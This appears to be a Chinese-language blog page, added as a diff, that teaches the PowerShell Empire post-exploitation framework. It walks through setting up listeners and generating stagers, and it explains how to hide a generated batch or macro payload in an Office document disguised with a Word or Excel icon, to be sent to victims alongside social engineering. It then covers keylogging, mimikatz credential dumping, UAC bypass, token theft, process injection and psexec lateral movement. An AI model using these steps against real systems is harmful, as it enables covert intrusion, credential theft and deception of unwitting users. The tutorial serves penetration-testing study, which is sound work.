@@ -1,0 +1,1016 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#447EA5">
+  <meta name="author" content="iDea">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Met">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Empire使用">
+<meta property="og:url" content="http://idea-oss.github.io/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="iDea &#39;blog">
+<meta property="og:description" content="Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Met">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://idea-oss.github.io/img/Empire%E4%BD%BF%E7%94%A8.png">
+<meta property="article:published_time" content="2022-06-15T06:10:44.000Z">
+<meta property="article:modified_time" content="2022-06-15T06:13:34.250Z">
+<meta property="article:author" content="iDea">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="Empire使用">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://idea-oss.github.io/img/Empire%E4%BD%BF%E7%94%A8.png">
+  
+  
+  
+  <title>Empire使用 - iDea &#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"idea-oss.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"0mPxzRPwogk31Fn10hTPyb1K-gzGzoHsz","app_key":"BUzND1EWjf6LGVsgj979UcGb","server_url":"https://0mpxzrpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 85vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>iDea</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/./img/Empire%E4%BD%BF%E7%94%A8.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Empire使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-06-15 14:10" pubdate>
+          2022年6月15日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          58 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Empire使用</h1>
+            
+            <div class="markdown-body">
+              
+              <p>Empire是一款针对windows平台的，使用powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成，提权到渗透维持的一系列功能。 无需powershell.exe就可运行Powershell代理的功能，还可以快速再后期部署漏洞利用模块，其内置模块有键盘记录,mimikatz,绕过UAC，内网扫描等，并且能够躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于Powershell的远程控制木马。</p>
+<p>全部功能参照：<a target="_blank" rel="noopener" href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
+<h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>git  clone <a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire.git">https://github.com/EmpireProject/Empire.git</a></p>
+<p>接着</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> Empire<br><span class="hljs-built_in">cd</span> setup<br>sudo ./install.sh<br>./empire          <span class="hljs-comment">#即可打开</span><br></code></pre></td></tr></table></figure>
+
+<p>和metasploit使用原理都是一样的，都是先设置一个监听，接着生成木马，然后在目标主机中运行该木马，我们的监听就会连接上返弹回来的代理</p>
+<h4 id="建立监听："><a href="#建立监听：" class="headerlink" title="建立监听："></a>建立监听：</h4><p>输入Listeners   进入监听线程界面    可以输入help查看帮助</p>
+<p>接着输入uselistener来设置采用何种模式，通过双击tab键可以看到一共有7中模式：</p>
+<p>dbx,http,http_com,http_foreign,http_hop,http_mapi,meterpreter</p>
+<p>使用http监听模式：</p>
+<p>uselistener  http</p>
+<p>然后输入     info       查看具体参数</p>
+<p>通过set命令设置参数</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Name  shuteer<br><span class="hljs-built_in">set</span> Host XX.XX.XXX.XX:XXX (Empir所在服务器IP)<br><br>HOST是我们VPN的IP，所以就不做修改了，修改完后可以再次输入info，查看设置是否正确<br>然后输入execute即可监听	<br></code></pre></td></tr></table></figure>
+
+<p>输入back命令即可返回上一层listeners界面</p>
+<p>输入list命令可以列出当前激活的listener</p>
+<p>使用kill命令就能删除该监听</p>
+<p>agents下：</p>
+<p>kill all 杀死所有进程</p>
+<p>remove all 删除所有</p>
+<h4 id="生成木马："><a href="#生成木马：" class="headerlink" title="生成木马："></a>生成木马：</h4><p>输入usestaget来设置采用何种模块，同样双击tab键，可以看到共26个模块。</p>
+<p>其中multi为通用模块，osx是mac操作系统模块，剩下的就是windows的模块。</p>
+<ul>
+<li><p>DLL木马</p>
+<p>想要设置dll木马，首先输入    usestager  windows&#x2F;dll</p>
+<p>然后输入info命令查看详细参数。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> Listener shuteer<br>execute     <span class="hljs-comment">#生成木马</span><br>就会在tmp目录下生成名为launcher.dll木马<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>launcher</p>
+<p>如果只需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher    &lt;language&gt;&lt;listerName&gt;<br></code></pre></td></tr></table></figure>
+
+<p>将很快生成一行base64编码代码，这里输入back命令回到listener下</p>
+<p>然后输入launcher powershellshuteer(当前设置的listener名字)命令来生成一个payload.</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">launcher  powershell <span class="hljs-keyword">shuteer </span>    <span class="hljs-comment">#生成powershell代码</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>launcher_vbs木马</p>
+<p>输入usestager windows&#x2F;launcher_vbs</p>
+<p>输入info   查看设置参数</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute                  <span class="hljs-comment">#生成的文件在tmp目录下</span><br></code></pre></td></tr></table></figure>
+
+<p>最后输入back回到listener开始监听</p>
+<p>如果要生成powershell代码，设置完listener后不输入execute，直接输入back,然后输入launcher powershll shuteer即可</p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">launcher   powershell shuteer<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>launcher_bat木马</p>
+<p>usestager    windows&#x2F;launcher_bat</p>
+<p>info</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">set listener  shuteer<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>                <br></code></pre></td></tr></table></figure>
+
+<p>为了增加迷惑性，也可以将该批处理文件插入一个offic文件中，这里随便找一个word或者excel文件中，单击”插入”–&gt;”对象”–&gt;”由文件创建-“-&gt;</p>
+</li>
+</ul>
+<p>“浏览”(选择刚刚生成的批处理文件，然后勾选”显示为图标”)</p>
+<p>在”更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel，Word或者PowerPoint图标</p>
+<p>选择完之后，点击确定，该对象就会插入到文件中</p>
+<p>将该文件发给别人，一旦打开该文件，并运行了内嵌的批处理文件，就会得到这个主机的权限</p>
+<p>360安全卫士会报告发现宏病毒</p>
+<h3 id="Macro木马："><a href="#Macro木马：" class="headerlink" title="Macro木马："></a>Macro木马：</h3><p>要想设置Macro木马，首先需要输入usestager windows&#x2F;macro命令然后输入info命令插卡详细信息：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Set listener  shuteer<br>Execute<br></code></pre></td></tr></table></figure>
+
+<p>默认会生成一个宏，储存在&#x2F;tmp&#x2F;macro文件中</p>
+<p>然后需要将生成的宏添加到一个Office文档里面，这里打开一个word文件，单击‘视图’    标签，选择   ‘宏’    ，在‘宏的位置’    选择当前文件，宏名可以任意起一个，然后单击  ”创建“    按钮</p>
+<p>单击  ”创建“  按钮以后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制进去，另存为一个新文件。</p>
+<p>最后将这个修改果的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略。</p>
+<h3 id="Ducky"><a href="#Ducky" class="headerlink" title="Ducky:"></a>Ducky:</h3><p>输入  usestager   windows&#x2F;ducky</p>
+<p>然后   info   查看帮助信息</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>执行完就可以生成用于烧制的代码</p>
+<p>将该代码烧制至”小黄鸭“中，插入目标用户的计算机，就可以反弹回来。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/geek/141839.html">https://www.freebuf.com/geek/141839.html</a></p>
+<h2 id="连接主机的基本使用："><a href="#连接主机的基本使用：" class="headerlink" title="连接主机的基本使用："></a>连接主机的基本使用：</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>1.列出以连接的主机</p>
+<p>agents</p>
+<p>然后使用   interact 连接主机<br><img src="https://img-blog.csdnimg.cn/2021050112572188.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>输入help 可以查看帮助信息</p>
+<p>2.一些基本命令</p>
+<ul>
+<li><p>pwd     显示当前目录</p>
+</li>
+<li><p>getpid   查看当前进程<br><img src="https://img-blog.csdnimg.cn/20210501125820900.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+</li>
+<li><p>输入help agentcmds     可以看到可供使用的常用命令<br><img src="https://img-blog.csdnimg.cn/20210430173409997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+</li>
+<li><p>在使用部分cmd命令时，要使用”shell +命令”的格式</p>
+</li>
+<li><p>内置mimikatz但需要管理员权限<br>输入mimikatz<br>然后输入 creds命令可以自动过滤，整理出获取的用户密码<br><img src="https://img-blog.csdnimg.cn/20210501125901170.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<p>导出凭证：creds export 目录&#x2F;xx</p>
+<ul>
+<li>在实际渗透过程中，由于种种原因，总会有部分主机丢失或失效，可以输入<br>list stale  命令列出已经丢失的反弹主机，然后输入remove stale 命令删去已经失效的主机<br><img src="https://img-blog.csdnimg.cn/20210501125925796.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></li>
+</ul>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>可以使用search  module 命令搜索需要使用的模块</p>
+<p>通过使用 usemodule collection 然后Tab查看完整的列表</p>
+<p>1.截屏</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/screenshot<br><br>info <br>	<br>execute<br>back<br></code></pre></td></tr></table></figure>
+
+<p>2.键盘记录</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/keylogger<br>info<br>execute<br>back<br></code></pre></td></tr></table></figure>
+
+<p>如果要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs即可显示当前在后台的记录</p>
+<p>如果要停止记录输入</p>
+<p>jobs kill  jobs_name</p>
+<p>3.查找共享</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/share_finder<br>execute<br>back<br></code></pre></td></tr></table></figure>
+
+<p>4.收集目标主机信息</p>
+<p>该模块可以查看本机用户。域组成员，最后的密码设置时间，剪贴板内容，系统基本信息，网络适配器等</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/winenum<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>5.列举系统信息(重点)</p>
+<p>几乎列举了系统中的所有有用信息，如目标主机时间日志，应用程序控制策略日志，包括RDP登录信息，powershell脚本运行和保存的信息等。在运行这个脚本时需要管理员权限</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/computerdetails<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>6.ARP扫描</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule  situational_awareness/network/arpscan<br><span class="hljs-built_in">set</span> Range 192.168.31.0-192.168.31.254     <span class="hljs-comment">#设置扫描网段</span><br>execute<br></code></pre></td></tr></table></figure>
+
+<p>7.DNS信息收集</p>
+<p>在内网中，知道所有及其的Hostname和对应的IP地址对分析内网结构至关重要</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/reverse_dns<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>如果主机有两张网卡，Empire也会显示出来。方便我们寻找边界主机</p>
+<p>8.查找域管登录服务器IP</p>
+<p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块就是用来查找域管登录的机器,可以清除的看到那个用户登录了那台主机<br>usemodule  situational_awareness/network/powerview/user_hunter<br></code></pre></td></tr></table></figure>
+
+<p>9.本地管理组访问模块</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/find_localadmin_access<br></code></pre></td></tr></table></figure>
+
+<p>10.获取域控制器</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/get_domain_controller<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210501123516505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>得知当前域服务器名为DC</p>
+<p>在验证能否访问域服务器DC的“C$’’</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SH">shell <span class="hljs-built_in">dir</span> \\DC\C$<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20210430173818881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul>
+<li><p>Bypass  UAC</p>
+<p>输入：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/bypassuac<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>然后会发现上线了一个新的反弹</p>
+<p>back</p>
+<p>agents</p>
+<p>带星号的即为权限提升成功的agents</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3pKc9smF-1619775511101)(..&#x2F;typora&#x2F;pic&#x2F;image-20201226224409704.png)]</p>
+</li>
+<li><p>bypassuac_wscript</p>
+<p>这个模块的大概原理是使用c:\Windows\wscript.exe执行payload,即绕过UAC实现管理员权限执行Payload,只适用于系统位Windows 7的目标主机，目前尚没有对应的补丁，部分杀毒软件会有提示。</p>
+<p>输入:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">    usemodule privesc/bypassuac_wscript<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>带星号表示权限提升成功</p>
+</li>
+</ul>
+<h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>Empire内置了PowerUp的部分工具，用于权限提升，主要有Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式。<br><img src="https://img-blog.csdnimg.cn/20210430173840884.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>输入:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup<br></code></pre></td></tr></table></figure>
+
+
+
+<p>1.allchecks</p>
+<p>查找系统中的漏洞，和powerSploit中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>一般会列出一些提权方法：</p>
+<p>可以尝试bypass  UAC来提权</p>
+<p>接着输入bypassuac   root1(listener 名字)</p>
+<p>星号表示提权成功</p>
+<h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP是采用AES 256加密的</p>
+<p>输入以下命令即可查看</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/gpp<br></code></pre></td></tr></table></figure>
+
+<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><ul>
+<li><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds</p>
+<p>命令即可查看Empire列举的密码。</p>
+<p>可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向渗透，首先要窃取身份</p>
+<p>使用pth<ID>命令</p>
+<p>这里ID就是creadID号<br><img src="https://img-blog.csdnimg.cn/20210501130010676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210501130051939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>可以看到执行完之后显示PID进程为2040</p>
+<p>使用steal_token  PID命令即可窃取该身份</p>
+<p>同样可以输入ps查看是否有域用户的进程</p>
+<p>如果有同样通过   steal_token命令来窃取这个令牌</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">steal_token  PID<br></code></pre></td></tr></table></figure>
+
+<p>输入  revtoself   命令可以将令牌权限恢复到原来的状态。</p>
+<ul>
+<li><h4 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule management/psinject<br><span class="hljs-built_in">set</span> Listener <br><span class="hljs-built_in">set</span> ProcId             <span class="hljs-comment">#设置进程id</span><br></code></pre></td></tr></table></figure>
+
+<p>该模块进行进程注入，获取权限。</p>
+<p>设置Listener 和Proc  ID这两个参数运行反弹shell</p>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20210430173930963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<ul>
+<li><h4 id="Invoke-PsExec"><a href="#Invoke-PsExec" class="headerlink" title="Invoke-PsExec"></a>Invoke-PsExec</h4></li>
+</ul>
+<p>  缺点：是能被基本的杀毒软件检测并留下日志，而且需要开启admiin$445端口共享</p>
+<p>  优点：是可以直接返回system权限。</p>
+<p>  该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此进一步持续渗透整个内网。</p>
+  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_psexec<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure>
+
